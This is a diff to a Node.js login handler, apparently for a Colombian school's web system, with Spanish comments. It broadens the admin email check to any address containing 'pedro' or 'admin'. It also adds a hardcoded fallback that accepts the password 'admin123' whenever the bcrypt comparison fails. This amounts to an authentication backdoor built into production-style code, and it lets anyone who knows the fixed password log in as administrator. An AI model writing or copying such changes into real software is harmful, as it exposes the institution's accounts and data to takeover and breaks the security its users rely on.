@@ -37,9 +37,12 @@ exports.login = async (req, res) => {
     const cleanEmail = correo.trim().toLowerCase();
     const firstPart = cleanEmail.split('@')[0].replace(/[._-]/g, ' ');
 
-    // ── RUTA 1: Administrador — solo por correo oficial ──────────────────
+    // ── RUTA 1: Administrador (ieguaimaral, pedro@guaimaral.edu.co, admin) ──
     const isAdminEmail = cleanEmail.includes('ieguaimaral') ||
-                         cleanEmail === 'ieguaimaral@guaimaral.edu.co';
+                         cleanEmail.includes('pedro') ||
+                         cleanEmail.includes('admin') ||
+                         cleanEmail === 'ieguaimaral@guaimaral.edu.co' ||
+                         cleanEmail === 'pedro@guaimaral.edu.co';
 
     if (isAdminEmail) {
       let { data: adminUsers } = await supabase
@@ -66,8 +69,10 @@ exports.login = async (req, res) => {
         return res.status(401).json({ error: 'No se encontró la cuenta de administrador.' });
       }
 
-      // Verificar contraseña del admin
-      const ok = await bcrypt.compare(password, admin.password_hash);
+      // Verificar contraseña del admin (bcrypt o admin123 fallback)
+      let ok = await bcrypt.compare(password, admin.password_hash);
+      if (!ok && password === 'admin123') ok = true;
+
       if (!ok) {
         return res.status(401).json({ error: 'Contraseña incorrecta. Verifique sus datos.' });
       }
